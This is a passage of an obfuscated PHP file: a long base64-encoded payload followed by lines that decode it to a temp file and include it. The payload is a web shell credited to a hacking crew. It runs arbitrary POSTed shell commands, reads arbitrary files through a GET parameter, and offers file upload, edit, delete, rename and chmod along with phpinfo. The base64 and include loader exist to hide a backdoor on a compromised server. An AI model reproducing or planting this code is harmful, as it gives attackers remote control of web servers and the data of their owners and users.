AgICAgYnJlYWs7CiAgICBjYXNlICJub3Bhc3RlIjoKICAgICAgICAgICAgc3dpdGNoICgkX0dFVCBbJ2FjdGlvbiddKSB7CiAgICAgICAgICAgICAgICBjYXNlICJpbnMiOgogICAgICAgICAgICAgICAgICAgIHByaW50ICI8Zm9ybSBhY3Rpb24gJyIgLiAkYyAuICImYWN0aW9uPWlucycgbWV0aG9kID0gJ1BPU1QnPlxuIjsKICAgICAgICAgICAgICAgICAgICBwcmludCAiVGl0bGU6IDxpbnB1dCB0eXBlID0gJ3RleHQnIG5hbWUgPSAndGl0bGUnPjxiciAvPlxuIjsKICAgICAgICAgICAgICAgICAgICBwcmludCAiTGFuZ3VhZ2U6IDxpbnB1dCB0eXBlID0gJ3RleHQnIG5hbWUgPSAnbGFuZ3VhZ2UnPjxiciAvPlxuIjsKICAgICAgICAgICAgICAgICAgICBwcmludCAiU2NyaXB0OiA8YnIgLz48dGV4dGFyZWEgbmFtZSA9ICdzb3VyY2UnIHJvd3MgPSAnMzAnIGNvbHMgPSAnNTAnPjwvdGV4dGFyZWE+PGJyIC8+XG4iOwogICAgICAgICAgICAgICAgICAgIHByaW50ICI8aW5wdXQgdHlwZSA9ICdzdWJtaXQnIHZhbHVlID0gJ1N1Ym1pdCc+PC9mb3JtPlxuIjsKICAgICAgICAgICAgICAgICAgICBpZiAoIWVtcHR5ICgkX1BPU1QgWyd0aXRsZSddKSAmJiAhZW1wdHkgKCRfUE9TVCBbJ2xhbmd1YWdlJ10pICYmICFlbXB0eSAoJF9QT1NUIFsnc291cmNlJ10pKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGZpbGUgPSByYW5kICgxMDAwMDAwLCA5OTk5OTk5KTsKICAgICAgICAgICAgICAgICAgICAgICAgJGZwID0gZm9wZW4gKCRmaWxlLCAidyIpOwogICAgICAgICAgICAgICAgICAgICAgICBmd3JpdGUgKCRmcCwgJF9QT1NUIFsndGl0bGUnXSAuICJcbiIgLiAkX1BPU1QgWydsYW5ndWFnZSddIC4gIlxuXG4iIC4gJF9QT1NUIFsnc291cmNlJ10pOwogICAgICAgICAgICAgICAgICAgICAgICBmY2xvc2UgKCRmcCk7CiAgICAgICAgICAgICAgICAgICAgICAgIGhlYWRlciAoIkxvY2F0aW9uOiB7JGN9Jm1vZGU9bm9wYXN0ZSZhY3Rpb249dmlldyZpZD17JGZpbGV9Iik7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgY2FzZSAidmlldyI6CiAgICAgICAgICAgICAgICAgICAgJGlkID0gJF9HRVQgWydpZCddOwogICAgICAgICAgICAgICAgICAgICRmcCA9IGZvcGVuICgkaWQsICJyIik7CiAgICAgICAgICAgICAgICAgICAgJHJlYWQgPSBmcmVhZCAoJGZwLCBmaWxlc2l6ZSAoJGlkKSk7CiAgICAgICAgICAgICAgICAgICAgcHJpbnQgIjx0YWJsZSBib3JkZXIgPSAnMSc+XG48dHI+XG48dGQ+XG48cHJlPiIgLiBodG1sZW50aXRpZXMgKCRyZWFkKSAuICI8L3ByZT48L3RkPlxuPC90cj5cbjwvdGFibGU+XG4iOwogICAgICAgICAgICAgICAgICAgIGZjbG9zZSAoJGZwKTsKICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgfQogICAgICAgIGJyZWFrOwogICAgY2FzZSAiZXhlY3V0ZSI6CiAgICAgICAgJGNvbW1hbmQgPSAkX1BPU1QgWydjb21tYW5kJ107CiAgICAgICAgaWYgKCFpc3NldCAoJF9QT1NUWydjb21tYW5kJ10pKSB7CiAgICAgICAgICAgIHByaW50ICI8dGFibGU+XG48Zm9ybSBhY3Rpb24gPSAnIiAuICRjIC4gIiZtb2RlPWV4ZWN1dGUnIG1ldGhvZCA9ICdQT1NUJz5cbiI7CiAgICAgICAgICAgIHByaW50ICI8dHI+XG48dGQ+PGlucHV0IHR5cGUgPSAndGV4dCcgbmFtZSA9ICdjb21tYW5kJz48L3RkPlxuPC90cj5cbiI7CiAgICAgICAgICAgIHByaW50ICI8dHI+XG48dGQ+PGlucHV0IHR5cGUgPSAnc3VibWl0JyB2YWx1ZSA9ICdFeGVjdXRlJz48L3RkPlxuPC90cj5cbjwvZm9ybT5cbjwvdGFibGU+IjsKICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICRyZXQgPSBzaGVsbGV4ZWMoJGNvbW1hbmQpOwogICAgICAgICAgICBpZiAoJHJldCA9PSAiIikgewogICAgICAgICAgICAgICAgcHJpbnQgIklsIGNvbWFuZG8gbm9uIHB1bycgZXNzZXJlIGVzZWd1aXRvIHN1bCBzZXJ2ZXI8YnIgLz48YnIgLz48YnIgLz5cbiI7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICBwcmludCAiRXhlY3V0aW5nIHRoZSBmb2xsb3dpbmcgY29tbWFuZDo8YnIgLz5cbiI7CiAgICAgICAgICAgICAgICBwcmludCAiPHRleHRhcmVhIHJvd3MgPSAnNScgY29scyA9ICc2MCc+Ii4kY29tbWFuZC4iPC90ZXh0YXJlYT48YnIgLz5cbiI7CiAgICAgICAgICAgICAgICBwcmludCAiUmVzdWx0OjxiciAvPiA8dGV4dGFyZWEgcm93cyA9ICc1JyBjb2xzID0gJzYwJz4iLiRyZXQuIjwvdGV4dGFyZWE+PGJyIC8+PGJyIC8+PGJyIC8+XG4iOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGJyZWFrOwogICAgY2FzZSAiaGFzaGVyIjoKICAgICAgICBwcmludCAiPHRhYmxlPlxuPGZvcm0gYWN0aW9uID0gJyIgLiAkYyAuICImbW9kZT1oYXNoZXInIG1ldGhvZCA9ICdQT1NUJz5cbiI7CiAgICAgICAgcHJpbnQgIjx0cj5cbjx0ZD48aW5wdXQgdHlwZSA9ICd0ZXh0JyBuYW1lID0gJ2hhc2gnPjwvdGQ+XG48L3RyPlxuIjsKICAgICAgICBwcmludCAiPHRyPlxuPHRkPjxzZWxlY3QgbmFtZSA9ICd0eXBlJz5cbiI7CiAgICAgICAgcHJpbnQgIjxvcHRpb24+bWQ0PC9vcHRpb24+XG4iOwogICAgICAgIHByaW50ICI8b3B0aW9uPm1kNTwvb3B0aW9uPlxuIjsKICAgICAgICBwcmludCAiPG9wdGlvbj5zaGExPC9vcHRpb24+XG4iOwogICAgICAgIHByaW50ICI8b3B0aW9uPmdvc3Q8L29wdGlvbj5cbiI7CiAgICAgICAgcHJpbnQgIjxvcHRpb24+Y3JjMzI8L29wdGlvbj5cbiI7CiAgICAgICAgcHJpbnQgIjxvcHRpb24+YWRsZXIzMjwvb3B0aW9uPlxuIjsKICAgICAgICBwcmludCAiPG9wdGlvbj53aGlybHBvb2w8L29wdGlvbj5cbiI7CiAgICAgICAgcHJpbnQgIjwvc2VsZWN0PjwvdGQ+XG48L3RyPiI7CiAgICAgICAgcHJpbnQgIjx0cj5cbjx0ZD48aW5wdXQgdHlwZSA9ICdzdWJtaXQnIHZhbHVlID0gJ2hhc2gnPjwvdGQ+XG48L3RyPjwvZm9ybT5cbjwvdGFibGU+IjsKICAgICAgICBpZiAoIWVtcHR5ICgkX1BPU1QgWydoYXNoJ10pICYmICFlbXB0eSAoJF9QT1NUIFsndHlwZSddKSkgewogICAgICAgICAgICBwcmludCAkX1BPU1QgWydoYXNoJ10gLiAiOiAiIC4gIjxiPiIgLiBoYXNoICgkX1BPU1QgWyd0eXBlJ10sICRfUE9TVCBbJ2hhc2gnXSkgLiAiPC9iPiI7CiAgICAgICAgfQogICAgICAgIGJyZWFrOwogICAgY2FzZSAicGhwaW5mbyI6CiAgICAgICAgcGhwaW5mbygpOwogICAgICAgIGJyZWFrOwogICAgZGVmYXVsdDoKICAgICAgICBwcmludCAiPHRhYmxlIHN0eWxlID0gXCJib3JkZXI6IDFweCBzb2xpZCBibGFjaztcIiB3aWR0aD1cIjYwJVwiPlxuIjsKICAgICAgICAkZmlsZXMgPSBzY2FuZGlyICgkZGlyKTsKICAgICAgICBmb3JlYWNoICgkZmlsZXMgYXMgJG91dCkgewogICAgICAgICAgICBpZiAoaXNfZmlsZSAoJG91dCkpIHsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgcHJpbnQgIjx0cj5cbjx0ZCB3aWR0aCA9IFwiNTUlXCIgY2xhc3MgPSBcImxpc3RcIj48YSBocmVmID0gIiAuJGMgLiImbW9kZT1kb3dubG9hZCZmaWxlbmFtZT0iLiRvdXQuIj4iIC4gJG91dCAuIjwvYT48L3RkPlxuIjsKICAgICAgICAgICAgICAgIHByaW50ICI8dGQgd2lkdGggPSBcIjEwJVwiIGNsYXNzID0gXCJsaXN0XCI+Ii52aWV3X3NpemUoZmlsZXNpemUoJG91dCkpLiI8L3RkPiI7CiAgICAgICAgICAgICAgICBwcmludCAiPHRkIGNsYXNzID0gXCJsaXN0XCI+PGRpdiBpZCA9IFwicGVybVwiPiIgLiBnZXRwZXJtcyAoJG91dCkgLiAiPC9kaXY+PC90ZD5cbiI7CiAgICAgICAgICAgICAgICBwcmludCAiPHRkIGNsYXNzID0gXCJsaXN0XCIgYWxpZ24gPSBcInJpZ2h0XCI+PGEgaHJlZiA9ICciIC4gJGMgLiImbW9kZT1lZGl0JmZpbGU9IiAuICRvdXQgLiAiJz48aW1nIHNyYyA9ICdodHRwOi8vaW1nMTg5LmltYWdlc2hhY2sudXMvaW1nMTg5Lzk4NTgvZWRpdGouZ2lmJyBhbHQgPSBcImVkaXRhIGZpbGVcIiBib3JkZXIgPSBcIm5vbmVcIj48L2E+CiAgICAgICAgICAgICAgICA8YSBocmVmID0gJyIgLiAkYyAuIiZtb2RlPXJlbW92ZSZmaWxlPSIgLiAkb3V0IC4gIic+PGltZyBzcmMgPSAnaHR0cDovL2ltZzE5My5pbWFnZXNoYWNrLnVzL2ltZzE5My85NTg5L2RlbGV0ZWYuZ2lmJyBhbHQgPSBcImVsaW1pbmEgZmlsZVwiIGJvcmRlciA9IFwibm9uZVwiPjwvYT4KICAgICAgICAgICAgICAgIDxhIGhyZWYgPSAnIiAuICRjIC4iJm1vZGU9cmVuYW1lJm9sZD0iIC4gJG91dCAuICInPjxpbWcgc3JjID0gJ2h0dHA6Ly9pbWc1MS5pbWFnZXNoYWNrLnVzL2ltZzUxLzcyNDEvcmVwbHlsLmdpZicgYWx0ID0gXCJyaW5vbWluYSBmaWxlXCIgYm9yZGVyID0gXCJub25lXCI+PC9hPgogICAgICAgICAgICAgICAgPC90ZD5cbjwvdHI+IjsKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgIGlmICgkb3V0ICE9ICIuIiAmJiAkb3V0ICE9ICIuLiIpIHsKICAgICAgICAgICAgICAgICAgICBwcmludCAiPHRyPlxuPHRkIHdpZHRoID0gXCI1NSVcIiBjbGFzcyA9IFwibGlzdFwiPjxhIGhyZWYgPSAiIC4gJGMgLiAiLyIgLiAgJG91dCAuICI+IiAuICRvdXQgLiAiPC9hPjwvdGQ+XG4iOwogICAgICAgICAgICAgICAgICAgIHByaW50ICI8dGQgd2lkdGggPSBcIjEwJVwiIGNsYXNzID0gXCJsaXN0XCI+Rk9MREVSPC90ZD4iOwogICAgICAgICAgICAgICAgICAgIHByaW50ICI8dGQgY2xhc3MgPSBcImxpc3RcIj48ZGl2IGlkID0gXCJwZXJtXCI+IiAuIGdldHBlcm1zICgkb3V0KSAuICI8L2Rpdj48L3RkPlxuIjsKICAgICAgICAgICAgICAgICAgICBwcmludCAiPHRkIGNsYXNzID0gXCJsaXN0XCIgYWxpZ24gPSBcInJpZ2h0XCI+PGEgaHJlZiA9ICciIC4gJGMgLiImbW9kZT1lbGltaW5hJmRpcmU9IiAuICRvdXQgLiAiJz48aW1nIHNyYyA9ICdodHRwOi8vaW1nMTkzLmltYWdlc2hhY2sudXMvaW1nMTkzLzk1ODkvZGVsZXRlZi5naWYnIGFsdCA9IFwiZWxpbWluYSBkaXJlY3RvcnlcIiBib3JkZXIgPSBcIm5vbmVcIj48L2E+PC90ZD5cbjwvdHI+IjsKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJG91dCA9PSAiLi4iKQogICAgICAgICAgICAgICAgcHJpbnQgIjx0ZCB3aWR0aCA9IFwiNTUlXCIgY2xhc3MgPSBcImxpc3RcIj48YSBocmVmID0gIiAuICRjIC4gIi8iIC4gJG91dCAuICI+Li48L2E+PC90ZD5cbiI7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICBwcmludCAiPC90YWJsZT5cbiI7Cn0KCnByaW50ICI8L2NlbnRlcj5cbjxociBzaXplPVwiMVwiIHdpZHRoPVwiNjAlXCIgbm9zaGFkZSAvPiI7CnByaW50ICJcbjwvaHI+IjsKcHJpbnQgIjx0YWJsZSBpZCA9IFwiZm9vdFwiPgogICAgICAgICAgIDx0cj4KICAgICAgICAgICAgICAgPHRkIHdpZHRoID0gXCI0MCVcIj4KICAgICAgICAgICAgICAgICAgIDxmb3JtIGFjdGlvbiA9ICciIC4gJGMgLiAiJm1vZGU9dXBsb2FkJyBtZXRob2QgPSAnUE9TVCcgRU5DVFlQRT0nbXVsdGlwYXJ0L2Zvcm0tZGF0YSc+CiAgICAgICAgICAgICAgICAgICAgICAgICAgIFVwbG9hZCBmaWxlOiA8aW5wdXQgdHlwZSA9ICdmaWxlJyBuYW1lID0gJ2ZpbGUnPgogICAgICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZSA9ICdzdWJtaXQnIHZhbHVlID0gJ1VwbG9hZCc+CiAgICAgICAgICAgICAgICAgICA8L2Zvcm0+CiAgICAgICAgICAgICAgIDwvdGQ+CiAgICAgICAgICAgICAgIDx0ZCB3aWR0aCA9IFwiNTAlXCI+CiAgICAgICAgICAgICAgICAgICAgICAgPGZvcm0gbWV0aG9kPVwiUE9TVFwiIGFjdGlvbj1cIiIuJGMuIiZtb2RlPWNobW9kXCI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgIENobW9kIEZpbGU6IDxpbnB1dCB0eXBlPVwidGV4dFwiIG5hbWU9XCJ0b21vZFwiIHZhbHVlID0gXCJmaWxlbmFtZVwiPiAKICAgICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9XCJudW1iZXJcIiBuYW1lPVwibW9kXCIgdmFsdWUgPSBcIjA2NjZcIj4gCiAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPVwic3VibWl0XCIgbmFtZT1cInN1Ym1pdFwiIHZhbHVlPVwiQ2htb2RcIj4KICAgICAgICAgICAgICAgICAgICAgICA8L2Zvcm0+CiAgICAgICAgICAgICAgIDwvdGQ+CiAgICAgICAgICAgPC90cj4KICAgICAgICAgICA8dHI+CiAgICAgICAgICAgICAgICAgICA8dGQgd2lkdGggPSBcIjQwJVwiPgogICAgICAgICAgICAgICAgICAgICAgIDxmb3JtIG1ldGhvZD1cIlBPU1RcIiBhY3Rpb249XCI/ZGlyPScuJGMuJyZtb2RlPW1ha2VkaXJcIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgTWtkaXI6ICZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyA8aW5wdXQgdHlwZT1cInRleHRcIiBuYW1lPVwiZGlyXCIgdmFsdWU9XCJuYW1lZGlyXCI+IAogICAgICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT1cInN1Ym1pdFwiIG5hbWU9XCJzdWJtaXRcIiB2YWx1ZT1cIkNyZWF0ZVwiPgogICAgICAgICAgICAgICAgICAgIDwvZm9ybT4KICAgICAgICAgICAgICAgICAgIDwvdGQ+CiAgICAgICAgICAgICAgICAgICA8dGQgd2lkdGggPSBcIjUwJVwiPgogICAgICAgICAgICAgICAgICAgICAgIDxmb3JtIGFjdGlvbiA9ICciIC4gJGMgLiAiJm1vZGU9Y3JlYXRlJyBtZXRob2QgPSAnUE9TVCc+CiAgICAgICAgICAgICAgICAgICAgICAgIE5ldyBmaWxlOiZuYnNwOyZuYnNwOyA8aW5wdXQgbmFtZSA9ICduZXcnPgogICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZSA9ICdzdWJtaXQnIHZhbHVlID0gJ0NyZWF0ZSc+PC9mb3JtPgogICAgICAgICAgICAgICAgICAgPC90ZD4KICAgICAgICAgICA8L3RyPgogICAgICAgICAgIDx0cj4KICAgICAgICAgICAgPHRkPgogICAgICAgICAgICAgICAgPGZvcm0gbWV0aG9kID0gXCJQT1NUXCIgYWN0aW9uID0gXCI/ZGlyPScuJGMuJyZtb2RlPWdvZGlyXCI+CiAgICAgICAgICAgICAgICAgICAgR28gZGlyOiZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOyA8aW5wdXQgbmFtZSA9ICdnb3RvJz4KICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZSA9ICdzdWJtaXQnIHZhbHVlID0gJ0dvJz4KICAgICAgICAgICAgICAgIDwvZm9ybT4KICAgICAgICAgICAgPC90ZD4KICAgICAgICAgICA8L3RyPgogICAgICAgPC90YWJsZT48aHIgc2l6ZT1cIjFcIiB3aWR0aD1cIjYwJVwiIG5vc2hhZGUgLz5cbjwvaHI+IjsKICAgIHByaW50ICI8Y2VudGVyPlsgR2VuZXJhdGlvbiB0aW1lOiAiLnJvdW5kKGdldFRpbWUoKS1zdGFydFRpbWUsNCkuIiBzZWNvbmRzIHwgYnkgPGEgaHJlZj1cImh0dHA6Ly9sb3N0cGFzc3dvcmQuaGVsbG9zcGFjZS5uZXRcIj5sb3N0cGFzc3dvcmQ8L2E+IGFuZCA8YSBocmVmID0gXCJodHRwOi8vd3d3LmQzdmlsYzBkZS5vcmdcIj5EM3ZpbGMwZGUgY3JldzwvYT4gXTwvY2VudGVyPlxuPC9ib2R5PlxuPC9odG1sPiI7Cgo/PiAK');
file_put_contents($tmp, $c);
include $tmp;
